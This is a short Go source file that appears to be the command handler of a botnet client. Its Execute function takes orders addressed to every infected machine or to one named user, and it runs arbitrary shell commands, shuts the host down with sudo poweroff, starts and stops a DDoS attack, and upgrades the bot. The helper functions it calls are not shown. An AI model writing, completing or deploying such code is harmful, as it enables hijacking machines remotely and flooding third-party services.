package main
import "fmt"
import "strings"
func Execute(command string, target string, args string) {
	if target == "*" || target == GetUsername() {
		switch command {
		case "cmd":
			args = strings.Replace(args, "-", " ", -1)
			args = strings.Replace(args, "\n", "", -1)
			fmt.Println(Run(args));
		case "off":
			Run("sudo poweroff");
		case "ddos":
			DdosApi(100, args)
		case "sdd":
			StopDdos()
		case "upgrade":
			Upgrade(args)
		default:
			Send("res", "Not a command")
		}
	}
}
